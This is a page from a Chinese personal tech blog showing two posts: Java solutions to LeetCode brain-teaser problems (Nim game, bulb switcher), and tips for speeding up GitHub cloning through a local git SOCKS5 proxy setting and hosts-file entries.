          <a href="/2018/03/21/2018-03-21-leetcode%E8%84%91%E7%AD%8B%E6%80%A5%E8%BD%AC%E5%BC%AF/" class="post-title-link" itemprop="url">leetcode脑筋急转弯</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-03-21 00:00:00" itemprop="dateCreated datePublished" datetime="2018-03-21T00:00:00+08:00">2018-03-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>​    </p>
<p>刷题无聊，不如来做几道脑筋急转弯嘛(手动滑稽.jpg)</p>
<h3 id="292-Nim游戏-https-leetcode-cn-com-problems-nim-game"><a href="#292-Nim游戏-https-leetcode-cn-com-problems-nim-game" class="headerlink" title="292. Nim游戏](https://leetcode-cn.com/problems/nim-game/)"></a><a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/nim-game/">292. Nim游戏</a>](<a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/nim-game/">https://leetcode-cn.com/problems/nim-game/</a>)</h3><p>你和你的朋友，两个人一起玩 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Nim%E6%B8%B8%E6%88%8F/6737105">Nim游戏</a>：桌子上有一堆石头，每次你们轮流拿掉 1 - 3 块石头。 拿掉最后一块石头的人就是获胜者。你作为先手。</p>
<p>你们是聪明人，每一步都是最优解。 编写一个函数，来判断你是否可以在给定石头数量的情况下赢得游戏。</p>
<p><strong>示例:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: 4</span><br><span class="line">输出: false </span><br><span class="line">解释: 如果堆中有 4 块石头，那么你永远不会赢得比赛；</span><br><span class="line">     因为无论你拿走 1 块、2 块 还是 3 块石头，最后一块石头总是会被你的朋友拿走。</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canWinNim</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">4</span>!=<span class="number">0</span>)  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="319-灯泡开关"><a href="#319-灯泡开关" class="headerlink" title="319. 灯泡开关"></a><a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/bulb-switcher/">319. 灯泡开关</a></h3><p>初始时有 <em>n</em> 个灯泡关闭。 第 1 轮，你打开所有的灯泡。 第 2 轮，每两个灯泡你关闭一次。 第 3 轮，每三个灯泡切换一次开关（如果关闭则开启，如果开启则关闭）。第 <em>i</em> 轮，每 <em>i</em> 个灯泡切换一次开关。 对于第 <em>n</em> 轮，你只切换最后一个灯泡的开关。 找出 <em>n</em> 轮后有多少个亮着的灯泡。</p>
<p><strong>示例:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入: 3</span><br><span class="line">输出: 1 </span><br><span class="line">解释: </span><br><span class="line">初始时, 灯泡状态 [关闭, 关闭, 关闭].</span><br><span class="line">第一轮后, 灯泡状态 [开启, 开启, 开启].</span><br><span class="line">第二轮后, 灯泡状态 [开启, 关闭, 开启].</span><br><span class="line">第三轮后, 灯泡状态 [开启, 关闭, 关闭]. </span><br><span class="line"></span><br><span class="line">你应该返回 1，因为只有一个灯泡还亮着。</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">bulbSwitch</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)Math.floor(Math.sqrt(n));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="777-在LR字符串中交换相邻字符"><a href="#777-在LR字符串中交换相邻字符" class="headerlink" title="777. 在LR字符串中交换相邻字符"></a><a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/swap-adjacent-in-lr-string/">777. 在LR字符串中交换相邻字符</a></h3><p>在一个由 <code>&#39;L&#39;</code> , <code>&#39;R&#39;</code> 和 <code>&#39;X&#39;</code> 三个字符组成的字符串（例如<code>&quot;RXXLRXRXL&quot;</code>）中进行移动操作。一次移动操作指用一个<code>&quot;LX&quot;</code>替换一个<code>&quot;XL&quot;</code>，或者用一个<code>&quot;XR&quot;</code>替换一个<code>&quot;RX&quot;</code>。现给定起始字符串<code>start</code>和结束字符串<code>end</code>，请编写代码，当且仅当存在一系列移动操作使得<code>start</code>可以转换成<code>end</code>时， 返回<code>True</code>。</p>
<p><strong>示例 :</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入: start = &quot;RXXLRXRXL&quot;, end = &quot;XRLXXRRLX&quot;</span><br><span class="line">输出: True</span><br><span class="line">解释:</span><br><span class="line">我们可以通过以下几步将start转换成end:</span><br><span class="line">RXXLRXRXL -&gt;</span><br><span class="line">XRXLRXRXL -&gt;</span><br><span class="line">XRLXRXRXL -&gt;</span><br><span class="line">XRLXXRRXL -&gt;</span><br><span class="line">XRLXXRRLX</span><br></pre></td></tr></table></figure>

<p><strong>注意:</strong></p>
<ol>
<li><code>1 &lt;= len(start) = len(end) &lt;= 10000</code>。</li>
<li><code>start</code>和<code>end</code>中的字符串仅限于<code>&#39;L&#39;</code>, <code>&#39;R&#39;</code>和<code>&#39;X&#39;</code>。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 暂时不会  挖坑</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/03/19/%E6%8F%90%E9%AB%98Github-Clone%E9%80%9F%E5%BA%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/03/19/%E6%8F%90%E9%AB%98Github-Clone%E9%80%9F%E5%BA%A6/" class="post-title-link" itemprop="url">提高Github Clone速度</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-03-19 14:16:03" itemprop="dateCreated datePublished" datetime="2018-03-19T14:16:03+08:00">2018-03-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="Method-1-：SS-系统内置代理"><a href="#Method-1-：SS-系统内置代理" class="headerlink" title="Method 1 ：SS+系统内置代理"></a>Method 1 ：SS+系统内置代理</h2><p>用 git 内置代理，直接走系统中运行的代理工具中转，比如，你的 SS 本地端口是 1080（一般port均为1080），那么可以如下方式走代理：</p>
<p>P.S. 仅启动shadowsocks不起作用，需同时配置git内置代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy socks5://127.0.0.1:1080</span><br><span class="line">git config --global https.proxy socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure>

<p>编辑.gitconfig文件</p>
<blockquote>
<p>.gitconfig文件地址（以windows为例）<br>C:\Users\username.gitconfig</p>
</blockquote>
<h2 id="Method-2-：修改系统hosts"><a href="#Method-2-：修改系统hosts" class="headerlink" title="Method 2 ：修改系统hosts"></a>Method 2 ：修改系统hosts</h2><p>git clone或者git push特别慢，可能是因为 <a target="_blank" rel="noopener" href="http://github.com、http//github.global.ssl.fastly.Net">http://github.com、http://github.global.ssl.fastly.Net</a><br>这两个域名被限制了。<br>那么可以在hosts文件里进行绑定映射。</p>
<p>1.输入相应域名，使用<a target="_blank" rel="noopener" href="http://tool.chinaz.com/">DNS检测</a><br>2.找TTL值最小的响应ip<br>3.修改本地hosts文件<br>示例：在末尾添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">151.101.72.249 http://global-ssl.fastly.Net</span><br><span class="line">192.30.253.112 http://github.com</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">沄渊</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
